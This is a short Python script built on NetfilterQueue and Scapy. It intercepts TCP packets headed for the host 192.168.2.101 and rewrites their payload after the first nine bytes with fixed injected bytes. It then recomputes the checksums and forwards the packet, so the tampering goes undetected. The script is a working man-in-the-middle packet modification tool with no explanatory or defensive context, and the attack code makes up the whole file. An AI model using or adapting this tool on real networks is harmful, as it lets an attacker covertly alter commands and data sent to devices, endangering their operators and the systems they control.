from netfilterqueue import NetfilterQueue
from scapy.all import *
print("start")
def processPacket(packet):
    pkt = IP(packet.get_payload())
    print (pkt.show())
    
    if (pkt.haslayer(TCP) and pkt[TCP].flags=='PA' and pkt.getlayer(IP).dst == '192.168.2.101'):
        print('+')
        print (pkt[Raw].load)
        pkt[Raw].load = pkt[Raw].load[:9] + b'\x0a\xb2\x0a\x01\x10\x85'
        print (pkt[Raw].load)
        print('-')
        del pkt[IP].len
        del pkt[IP].chksum
        del pkt[TCP].chksum
        packet.set_payload(bytes(pkt))
        print('pkt================================')
        print (pkt.show())
        # print('packet==================================')
        # print (IP(packet.get_payload()).show())
        print('====================================')
    packet.accept()

queue = NetfilterQueue()
queue.bind(0, processPacket)
queue.run()
